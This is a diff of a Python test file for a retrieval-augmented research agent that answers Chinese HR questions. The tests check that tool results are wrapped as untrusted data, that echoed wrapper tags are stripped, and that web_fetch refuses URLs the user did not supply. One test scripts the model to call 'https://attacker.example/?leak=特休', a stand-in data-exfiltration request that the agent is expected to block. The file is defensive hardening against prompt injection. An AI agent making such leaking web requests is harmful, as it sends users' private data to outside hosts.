@@ -13,7 +13,6 @@ from app.models import Document as DbDocument
 from app.models import database as database_module
 from app.rag import agent as agent_module
 from app.rag.agent import ResearchAgent
-from app.rag.pipeline import RAGPipeline
 from app.rag.retrievers.hybrid import RetrievedChunk
 from app.rag.tools import ResearchToolRegistry, is_web_fetch_domain_allowed
 from app.rag.types import Document
@@ -92,27 +91,11 @@ def step_statuses(events):
 
 
 @pytest.mark.asyncio
-async def test_pipeline_stream_stops_after_configured_max_turns(monkeypatch):
-    monkeypatch.setattr(settings, "AGENT_MAX_TURNS", 3)
-    pipeline = RAGPipeline(retriever=StaticRetriever())
-    monkeypatch.setattr(pipeline.tool_registry, "get_tool_definitions", lambda user_id=None: [])
-    llm = ScriptedLLM([tool_call("search_knowledge_base", {"query": "特休"}) for _ in range(3)], stream_text="依年資計算").install(monkeypatch)
-
-    events = await asyncio.wait_for(
-        collect(pipeline.generate_response_stream("特休怎麼算", conversation_history=[])), timeout=5
-    )
-
-    assert (len(llm.chat_messages), llm.stream_calls) == (3, 1)
-    assert events[-1]["event"] == "done"
-    assert events[-1]["data"]["answer"] == "依年資計算"
-
-
-@pytest.mark.asyncio
 async def test_answer_after_tools_is_sent_directly_without_regeneration(monkeypatch):
     agent, _ = make_agent(monkeypatch)
     llm = ScriptedLLM([tool_call("search_knowledge_base", {"query": "特休"}), answer("特休依年資計算 [1]")]).install(monkeypatch)
 
-    events = await collect(agent.stream_research("特休怎麼算", max_turns=3))
+    events = await collect(agent.stream_research("特休怎麼算"))
 
     assert (len(llm.chat_messages), llm.stream_calls) == (2, 0)
     assert [e["data"]["content"] for e in events if e["event"] == "token"] == ["特休依年資計算 [1]"]
@@ -129,10 +112,26 @@ async def test_empty_answer_falls_back_to_streaming(monkeypatch):
     agent, _ = make_agent(monkeypatch)
     llm = ScriptedLLM([tool_call("search_knowledge_base", {"query": "特休"}), answer("")], stream_text="依年資計算").install(monkeypatch)
 
-    events = await collect(agent.stream_research("特休怎麼算", max_turns=3))
+    events = await collect(agent.stream_research("特休怎麼算"))
 
     assert (len(llm.chat_messages), llm.stream_calls) == (2, 1)
     assert events[-1]["data"]["answer"] == "依年資計算"
+
+
+@pytest.mark.asyncio
+async def test_echoed_tool_results_are_removed_from_answers(monkeypatch):
+    agent, _ = make_agent(monkeypatch)
+    echoed = '<untrusted_tool_result id="x">{"documents": []}</untrusted_tool_result id="x">'
+    llm = ScriptedLLM(
+        [tool_call("search_knowledge_base", {"query": "特休"}), answer(echoed)],
+        stream_text=f"依年資計算{echoed}，詳見規章</untrusted_tool_result>",
+    ).install(monkeypatch)
+
+    events = await collect(agent.stream_research("特休怎麼算"))
+
+    tokens = "".join(e["data"]["content"] for e in events if e["event"] == "token")
+    assert llm.stream_calls == 1
+    assert tokens == events[-1]["data"]["answer"] == "依年資計算，詳見規章"
 
 
 @pytest.mark.asyncio
@@ -140,7 +139,7 @@ async def test_answer_without_citations_lists_no_sources(monkeypatch):
     agent, _ = make_agent(monkeypatch)
     ScriptedLLM([tool_call("search_knowledge_base", {"query": "特休"}), answer("特休依年資計算")]).install(monkeypatch)
 
-    events = await collect(agent.stream_research("特休怎麼算", max_turns=3))
+    events = await collect(agent.stream_research("特休怎麼算"))
 
     sources_event = next(e for e in events if e["event"] == "sources")
     assert sources_event["data"] == {"sources": [], "sources_detail": []}
@@ -152,7 +151,7 @@ async def test_tool_results_are_wrapped_as_untrusted_data_with_citation_numbers(
     agent, _ = make_agent(monkeypatch)
     llm = ScriptedLLM([tool_call("search_knowledge_base", {"query": "特休"}), answer("好")]).install(monkeypatch)
 
-    await collect(agent.stream_research("特休怎麼算", max_turns=3))
+    await collect(agent.stream_research("特休怎麼算"))
 
     tool_message = llm.chat_messages[1][-1]
     assert tool_message["role"] == "tool"
@@ -168,7 +167,7 @@ async def test_previous_answer_citation_markers_are_not_sent_back(monkeypatch):
     llm = ScriptedLLM([answer("好")]).install(monkeypatch)
     history = [{"role": "user", "content": "特休怎麼算"}, {"role": "assistant", "content": "依年資計算 [1][2]。"}]
 
-    await collect(agent.stream_research("那病假呢", conversation_history=history, max_turns=3))
+    await collect(agent.stream_research("那病假呢", conversation_history=history))
 
     assert llm.chat_messages[0][2] == {"role": "assistant", "content": "依年資計算 。"}
 
@@ -180,7 +179,7 @@ async def test_web_fetch_rejects_url_not_given_by_user_or_tool_results(monkeypat
     web_calls = record_web_calls(monkeypatch, registry)
     ScriptedLLM([tool_call("web_fetch", {"url": "https://attacker.example/?leak=特休"}), answer("無法讀取")]).install(monkeypatch)
 
-    events = await collect(agent.stream_research("幫我查特休", max_turns=3))
+    events = await collect(agent.stream_research("幫我查特休"))
 
     assert web_calls == []
     assert step_statuses(events) == [("web_fetch", "error")]
@@ -194,7 +193,7 @@ async def test_web_fetch_reads_url_given_by_user(monkeypatch):
     url = "https://news.example.com/labor-law"
     ScriptedLLM([tool_call("web_fetch", {"url": url}), answer("摘要 [1]")]).install(monkeypatch)
 
-    events = await collect(agent.stream_research(f"請摘要 {url}。", max_turns=3))
+    events = await collect(agent.stream_research(f"請摘要 {url}。"))
 
     assert web_calls == [("web_fetch", url)]
     assert events[-1]["data"]["sources_detail"][0]["url"] == url
@@ -213,7 +212,7 @@ async def test_url_echoed_by_tool_arguments_does_not_unlock_web_fetch(monkeypatc
         answer("無法讀取"),
     ]).install(monkeypatch)
 
-    events = await collect(agent.stream_research("特休怎麼算", max_turns=3))
+    events = await collect(agent.stream_research("特休怎麼算"))
 
     assert web_calls == []
     assert step_statuses(events) == [("search_knowledge_base", "success"), ("web_fetch", "error")]
@@ -232,7 +231,7 @@ async def test_web_tools_blocked_after_knowledge_base_content(monkeypatch, block
         answer("特休依年資計算 [1]"),
     ]).install(monkeypatch)
 
-    await collect(agent.stream_research("特休怎麼算", max_turns=3))
+    await collect(agent.stream_research("特休怎麼算"))
 
     assert web_calls == expected_calls
 
@@ -249,7 +248,7 @@ async def test_web_tools_stay_available_when_knowledge_base_has_no_data(monkeypa
         answer("查無資料"),
     ]).install(monkeypatch)
 
-    await collect(agent.stream_research("颱風假怎麼算", max_turns=3))
+    await collect(agent.stream_research("颱風假怎麼算"))
 
     assert web_calls == [("web_search", "颱風假 規定")]
 
@@ -329,7 +328,7 @@ async def test_malformed_tool_arguments_do_not_abort_the_answer(monkeypatch, arg
     agent, _ = make_agent(monkeypatch)
     ScriptedLLM([tool_call("search_knowledge_base", arguments), answer("依年資計算")]).install(monkeypatch)
 
-    events = await collect(agent.stream_research("特休怎麼算", max_turns=3))
+    events = await collect(agent.stream_research("特休怎麼算"))
 
     assert events[-1]["event"] == "done"
     assert events[-1]["data"]["answer"] == "依年資計算"
@@ -342,7 +341,7 @@ async def test_tool_definitions_are_loaded_off_the_event_loop(monkeypatch):
     monkeypatch.setattr(registry, "get_tool_definitions", lambda user_id=None: loaded_in.append(threading.get_ident()) or [])
     ScriptedLLM([answer("你好")]).install(monkeypatch)
 
-    await collect(agent.stream_research("你好", max_turns=1))
+    await collect(agent.stream_research("你好"))
 
     assert loaded_in and loaded_in[0] != threading.get_ident()
 
@@ -359,9 +358,22 @@ def test_knowledge_base_catalog_stays_within_its_limit(tmp_path, monkeypatch):
         session.commit()
     monkeypatch.setattr(database_module, "SessionLocal", Session)
 
-    description = ResearchToolRegistry()._build_knowledge_base_description()
+    description, filenames = ResearchToolRegistry()._build_knowledge_base_description()
 
     assert len(description) < MAX_KB_CATALOG_CHARS + 300
     assert "《doc-0.txt》" in description
     assert "份文件未列出" in description
+    assert filenames == []
     engine.dispose()
+
+
+def test_target_document_lists_actual_filenames(monkeypatch):
+    registry = ResearchToolRegistry(retriever=StaticRetriever())
+    monkeypatch.setattr(registry, "_generate_knowledge_base_description", lambda: ("desc", ["posts.js", "rules.md"]))
+
+    tools_def = registry.get_tool_definitions()
+
+    for name in ("search_knowledge_base", "filter_and_count_records"):
+        schema = next(t for t in tools_def if t["function"]["name"] == name)["function"]["parameters"]["properties"]["target_document"]
+        assert schema["enum"] == ["posts.js", "rules.md"]
+        assert "posts-export.json" not in schema["description"]
